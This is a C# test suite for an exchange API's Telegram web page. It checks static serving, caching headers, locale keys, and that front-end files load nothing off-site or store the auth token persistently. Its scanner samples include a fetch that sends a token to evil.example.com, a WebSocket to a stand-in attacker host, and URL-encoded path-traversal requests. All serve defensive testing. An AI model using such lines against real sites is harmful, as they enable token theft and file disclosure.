using System.Net;
using System.Text.Json;
using System.Text.RegularExpressions;
using Exchange.Api.Rates;
using Exchange.Api.Tests.Data;
using Exchange.Api.Tests.Repository;
using Exchange.Api.Tests.Settings;
using Exchange.Api.Web;
using Exchange.Domain.Directions;
using Exchange.Domain.Orders;
using Shouldly;

namespace Exchange.Api.Tests.Web;

/// <summary>
/// INV-18: the page and its files are served, and the front-end files keep the rules of spec 1.7 -
/// nothing is loaded from outside <c>telegram.org</c>, the token reaches no lasting storage, and
/// every locale key the page uses is in <c>ru.json</c>. Each scan fails if it finds no file. The page
/// itself is checked by hand at the PHASE-5 gate (L-6).
/// </summary>
public sealed partial class FrontendScanTests(PostgresFixture database)
{
    private const string AllowedOrigin = "https://telegram.org/";

    // Every kind of file that can make a browser load something.
    private static readonly HashSet<string> FrontendExtensions = new(StringComparer.OrdinalIgnoreCase) { ".html", ".js", ".mjs", ".css", ".svg" };

    // Addresses that load nothing: an SVG's namespace is a name, not a request.
    private static readonly HashSet<string> NonLoadingUrls = new(StringComparer.Ordinal) { "http://www.w3.org/2000/svg" };

    // The page's four tabs (spec 1.7).
    private static readonly string[] PageTabs = ["home", "exchange", "privileges", "profile"];

    private static readonly string WebRoot = Path.Combine(RepositoryRoot.Path, "src", "Exchange.Api", "wwwroot");

    private static readonly string LocaleFile = Path.Combine(WebRoot, "locale", "ru.json");

    // --- served -----------------------------------------------------------------------------------

    [Fact]
    public async Task The_page_is_served_at_the_root_without_caching()
    {
        using var factory = await FactoryAsync();
        using var client = factory.CreateClient();

        using var response = await client.GetAsync(new Uri("/", UriKind.Relative), TestContext.Current.CancellationToken);

        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        response.Content.Headers.ContentType!.MediaType.ShouldBe("text/html");
        response.Headers.CacheControl!.ToString().ShouldBe(FrontEnd.CacheControl);
        (await response.Content.ReadAsStringAsync(TestContext.Current.CancellationToken)).ShouldBe(await File.ReadAllTextAsync(Path.Combine(WebRoot, FrontEnd.PageFile), TestContext.Current.CancellationToken));
    }

    [Fact]
    public async Task Every_front_end_file_is_served_under_static_without_caching()
    {
        using var factory = await FactoryAsync();
        using var client = factory.CreateClient();
        var files = Directory.EnumerateFiles(WebRoot, "*", SearchOption.AllDirectories).ToList();
        files.ShouldNotBeEmpty();

        foreach (var file in files)
        {
            var path = FrontEnd.StaticPath + "/" + Path.GetRelativePath(WebRoot, file).Replace('\\', '/');
            using var response = await client.GetAsync(new Uri(path, UriKind.Relative), TestContext.Current.CancellationToken);

            response.StatusCode.ShouldBe(HttpStatusCode.OK, path);
            response.Headers.CacheControl!.ToString().ShouldBe(FrontEnd.CacheControl, path);
            (await response.Content.ReadAsByteArrayAsync(TestContext.Current.CancellationToken)).ShouldBe(await File.ReadAllBytesAsync(file, TestContext.Current.CancellationToken), path);
        }
    }

    [Theory]
    [InlineData("/static/..%2fExchange.Api.dll")]
    [InlineData("/static/%2e%2e/Exchange.Api.dll")]
    [InlineData("/static/missing.js")]
    [InlineData("/index.html")] // the files live under /static only
    public async Task Nothing_outside_the_web_root_is_served(string path)
    {
        using var factory = await FactoryAsync();
        using var client = factory.CreateClient();

        using var response = await client.GetAsync(new Uri(path, UriKind.Relative), TestContext.Current.CancellationToken);

        response.StatusCode.ShouldBe(HttpStatusCode.NotFound);
    }

    // --- the files keep the rules -------------------------------------------------------------------

    [Fact]
    public void The_scans_read_the_real_files()
    {
        // An empty walk would make every scan below pass; the page itself must be in it.
        FrontendFiles().Select(Path.GetFileName).ShouldContain(FrontEnd.PageFile);
        FrontendFiles().Select(Path.GetFileName).ShouldContain("app.js");
    }

    [Fact]
    public void The_front_end_loads_nothing_but_telegram()
    {
        foreach (var file in FrontendFiles())
        {
            LoadedUrls(File.ReadAllText(file)).ShouldAllBe(url => url.StartsWith(AllowedOrigin, StringComparison.Ordinal), Path.GetFileName(file));
        }
    }

    [Fact]
    public void The_token_never_reaches_lasting_storage()
    {
        foreach (var file in FrontendFiles())
        {
            StoragePattern().IsMatch(File.ReadAllText(file)).ShouldBeFalse(Path.GetFileName(file));
        }
    }

    [Fact]
    public void Every_text_the_page_uses_is_in_the_locale_file()
    {
        var messages = LocaleMessages();
        var keys = 0;
        foreach (var file in FrontendFiles())
        {
            var text = File.ReadAllText(file);
            keys += LocaleCall().Count(text);
            LocaleProblems(text, messages).ShouldBeEmpty(Path.GetFileName(file));
        }

        keys.ShouldBeGreaterThan(0); // a scan that finds no key proves nothing
    }

    [Fact]
    public void The_page_code_is_english_only()
    {
        // RULE-ENGLISH-ONLY: the Russian text lives in the locale file, never in the page's code.
        foreach (var file in FrontendFiles())
        {
            File.ReadAllText(file).ShouldNotContain(c => c > 127, Path.GetFileName(file));
        }
    }

    [Fact]
    public void The_locale_file_holds_text_only()
    {
        using var document = JsonDocument.Parse(File.ReadAllText(LocaleFile));
        document.RootElement.EnumerateObject().ShouldNotBeEmpty();
        document.RootElement.EnumerateObject().ShouldAllBe(p => p.Value.ValueKind == JsonValueKind.String && !string.IsNullOrWhiteSpace(p.Value.GetString()));
    }

    [Fact]
    public void The_form_orders_every_field_a_direction_can_ask_for()
    {
        var block = FieldOrderBlock().Match(File.ReadAllText(Path.Combine(WebRoot, "app.js")));
        block.Success.ShouldBeTrue("app.js has no FIELD_ORDER");
        var order = QuotedName().Matches(block.Groups[1].Value).Select(m => m.Groups[1].Value).ToList();

        order.Count.ShouldBe(order.Distinct().Count());
        order.ShouldBe(DetailFields.All, ignoreOrder: true);
    }

    // --- the scans themselves -----------------------------------------------------------------------

    [Theory]
    [InlineData("src=\"https://cdn.example.com/x.js\"")]
    [InlineData("fetch('//evil.example.com/collect?t=' + token)")]
    [InlineData("\"HTTPS://cdn.example.com/x.js\"")]
    [InlineData("new WebSocket(\"wss://evil.example.com/s\")")]
    [InlineData("@import url(\"//fonts.googleapis.com/css\");")]
    [InlineData("<image href='http://img.example.org/a.png'/>")]
    public void The_url_scan_sees_every_way_off_site(string sample)
    {
        var urls = LoadedUrls(sample);

        urls.ShouldNotBeEmpty();
        urls.ShouldNotContain(url => url.StartsWith(AllowedOrigin, StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("<script src=\"https://telegram.org/js/telegram-web-app.js\"></script>")]
    [InlineData("<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>")]
    [InlineData("// a comment, then code")]
    [InlineData("const half = total / 2; // half")]
    public void The_url_scan_lets_the_harmless_pass(string sample) =>
        LoadedUrls(sample).ShouldAllBe(url => url.StartsWith(AllowedOrigin, StringComparison.Ordinal));

    [Theory]
    [InlineData("localStorage.setItem('t', token)")]
    [InlineData("sessionStorage.t = token")]
    [InlineData("document.cookie = token")]
    [InlineData("cookieStore.set('t', token)")]
    [InlineData("Telegram.WebApp.CloudStorage.setItem('jwt', token)")]
    [InlineData("Telegram.WebApp.DeviceStorage.setItem('jwt', token)")]
    [InlineData("Telegram.WebApp.SecureStorage.setItem('jwt', token)")]
    [InlineData("indexedDB.open('db')")]
    public void The_storage_scan_sees_every_lasting_store(string sample) =>
        StoragePattern().IsMatch(sample).ShouldBeTrue();

    [Theory]
    [InlineData("t(\"no_such_key\")", "no key 'no_such_key'")]
    [InlineData("t(\"status_PENDNG\")", "no key 'status_PENDNG'")]
    [InlineData("t(`missing_key`)", "no key 'missing_key'")]
    [InlineData("t(\"status_\" + order.status)", "computed key without a known family marker")]
    [InlineData("t(key)", "computed key without a known family marker")]
    [InlineData("t(\"x_\" + v) // locale-dynamic: x_", "computed key without a known family marker")]
    public void The_locale_scan_sees_missing_and_unchecked_keys(string sample, string problem) =>
        LocaleProblems(sample, new Dictionary<string, string> { ["status_PENDING"] = "x" }).ShouldContain(found => found.Contains(problem, StringComparison.Ordinal));

    [Fact]
    public void The_lookup_definition_is_not_a_call()
    {
        LocaleProblems("function t(key) {", []).ShouldBeEmpty();
        LocaleProblems("const x = t(key); // function", []).ShouldNotBeEmpty();
    }

    [Fact]
    public void A_marked_family_must_be_complete()
    {
        var every = OrderCodes.AllStatuses.ToDictionary(s => "status_" + s, _ => "x");
        const string line = "t(\"status_\" + order.status) // locale-dynamic: status_";

        LocaleProblems(line, every).ShouldBeEmpty();
        every.Remove("status_CANCELLED");
        LocaleProblems(line, every).ShouldBe(["line 1: family status_ lacks status_CANCELLED"]);
    }

    // --- helpers ----------------------------------------------------------------------------------

    private static List<string> FrontendFiles() =>
        [.. Directory.EnumerateFiles(WebRoot, "*", SearchOption.AllDirectories).Where(f => FrontendExtensions.Contains(Path.GetExtension(f))).Order(StringComparer.Ordinal)];

    private static Dictionary<string, string> LocaleMessages() =>
        JsonSerializer.Deserialize<Dictionary<string, string>>(File.ReadAllText(LocaleFile))!;

    private static List<string> LoadedUrls(string text) =>
        [.. UrlPattern().Matches(text).Select(m => m.Value).Where(url => !NonLoadingUrls.Contains(url))];

    // The key families a computed lookup may read, each with every member it must cover.
    private static Dictionary<string, HashSet<string>> DynamicFamilies() => new(StringComparer.Ordinal)
    {
        ["status_"] = [.. OrderCodes.AllStatuses.Select(s => "status_" + s)],
        ["transfer_"] = [.. Codes.AllTransferTimes.Select(t => "transfer_" + t)],
        ["give_"] = [.. Codes.AllGive.Select(c => "give_" + c)],
        ["receive_"] = [.. Codes.AllReceive.Select(c => "receive_" + c)],

        // The page's own families, transcribed here so the test does not read app.js to check it.
        ["tab_"] = [.. PageTabs.Select(tab => "tab_" + tab)],
        ["field_"] = [.. DetailFields.All.Select(f => "field_" + f), "field_amount_give", "field_amount_receive", "field_give", "field_receive"],

        // Every component of the quote's breakdown the page labels; it skips the two sums.
        ["markup_"] = [.. typeof(RateEndpoints.MarkupOut).GetProperties()
            .Select(p => SnakeCase(p.Name))
            .Where(name => name is not "total" and not "applied")
            .Select(name => "markup_" + name)],
    };

    private static string SnakeCase(string name) => JsonNamingPolicy.SnakeCaseLower.ConvertName(name);

    // Every t(...) call either names a key the file has, or is marked and its family complete.
    private static List<string> LocaleProblems(string text, Dictionary<string, string> messages)
    {
        var problems = new List<string>();
        var families = DynamicFamilies();
        var lines = text.Split('\n');
        for (var index = 0; index < lines.Length; index++)
        {
            var line = lines[index];
            var number = index + 1;
            foreach (Match call in LocaleCall().Matches(line))
            {
                if (line[..call.Index].TrimEnd().EndsWith("function", StringComparison.Ordinal))
                {
                    continue; // the lookup's own definition, `function t(key)`
                }

                var literal = LiteralKey().Match(line, call.Index + call.Length);
                if (literal.Success && literal.Index == call.Index + call.Length)
                {
                    if (!messages.ContainsKey(literal.Groups[2].Value))
                    {
                        problems.Add($"line {number}: no key '{literal.Groups[2].Value}'");
                    }

                    continue;
                }

                var marker = DynamicMarker().Match(line);
                if (!marker.Success || !families.TryGetValue(marker.Groups[1].Value, out var family))
                {
                    problems.Add($"line {number}: computed key without a known family marker");
                    continue;
                }

                var missing = family.Where(key => !messages.ContainsKey(key)).Order(StringComparer.Ordinal).ToList();
                if (missing.Count > 0)
                {
                    problems.Add($"line {number}: family {marker.Groups[1].Value} lacks {string.Join(", ", missing)}");
                }
            }
        }

        return problems;
    }

    private async Task<TestAppFactory> FactoryAsync()
    {
        var environment = TestSettings.Production();
        environment["DATABASE_URL"] = await database.CreateMigratedDatabaseUrlAsync();
        return new TestAppFactory(environment);
    }

    // Any scheme (http, https, ws, wss, any case) or none at all (`//host`), then a host.
    [GeneratedRegex("""(?:\b[a-z][a-z0-9+.-]*:)?//[a-z0-9-]+(?:\.[a-z0-9-]+)+[^\s"'`)>]*""", RegexOptions.IgnoreCase)]
    private static partial Regex UrlPattern();

    // Browser and Telegram storage that outlives the page; the token may use none of it.
    [GeneratedRegex("""\b(localStorage|sessionStorage|document\.cookie|cookieStore|indexedDB|CloudStorage|DeviceStorage|SecureStorage)\b""")]
    private static partial Regex StoragePattern();

    // Every call of the page's text lookup `t(...)`.
    [GeneratedRegex("""\bt\(""")]
    private static partial Regex LocaleCall();

    // A literal key: t("key"), t('key') or t(`key`) without interpolation.
    [GeneratedRegex("""\s*(["'`])([^"'`$]+)\1\s*\)""")]
    private static partial Regex LiteralKey();

    // A computed key says which family it reads:  t("status_" + s) // locale-dynamic: status_
    [GeneratedRegex("""locale-dynamic:\s*([a-z_]+)""")]
    private static partial Regex DynamicMarker();

    // The page's display order of a direction's fields: `const FIELD_ORDER = [ ... ];`.
    [GeneratedRegex("""const FIELD_ORDER = \[(.*?)\];""", RegexOptions.Singleline)]
    private static partial Regex FieldOrderBlock();

    [GeneratedRegex("\"([a-z_]+)\"")]
    private static partial Regex QuotedName();
}
